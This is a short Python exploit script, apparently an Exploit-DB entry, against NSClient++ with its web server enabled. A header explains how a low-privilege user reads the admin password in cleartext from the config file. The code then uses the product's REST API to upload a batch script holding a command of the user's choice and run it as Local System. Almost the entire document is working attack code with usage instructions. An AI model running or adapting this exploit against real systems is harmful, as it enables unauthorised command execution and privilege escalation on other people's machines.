#!/usr/bin/python3
# Written by: Z3R0x30
# EDB-ID: 46802
# Description: When NSClient++ is installed with Web Server enabled, local low privilege users have the ability to read the web administator's password in cleartext from the configuration file.  From here a user is able to login to the web server and make changes to the configuration file that is normally restricted. The user is able to enable the modules to check external scripts and schedule those scripts to run.  There doesn't seem to be restrictions on where the scripts are called from, so the user can create the script anywhere.  Since the NSClient++ Service runs as Local System, these scheduled scripts run as that user and the low privilege user can gain privilege escalation.  A reboot, as far as I can tell, is required to reload and read the changes to the web config.
#######################################################

# Importing Necessary stuff
import requests
import time
import sys

# Trying to gather arguments
try:
    comm = sys.argv[1]
    host = sys.argv[2]
    password = sys.argv[3]
except IndexError:
    print("Usage: ./NSClient_Z3R0x30_exploit.py <command> <host> <password>")
    print("Example: ./NSClient_Z3R0x30_exploit.py c:\\temp\\rumMe.bat http://example.com:8443/ Jacky@123")
    sys.exit(-1)


# Trying the exploit
api_uri = "/api/v1/scripts/ext/scripts/myexploit.bat"
try:
    resp = requests.put(host+api_uri, data=comm, verify=False, auth=('admin', password))
    print(resp)
    resp = requests.get(host+'/api/v1/queries/myexploit/commands/execute?time=1m', verify=False, auth=('admin', password))
    print(resp)
except Exception as e:
    print("Host is not vulnerable.")
    print(str(e))
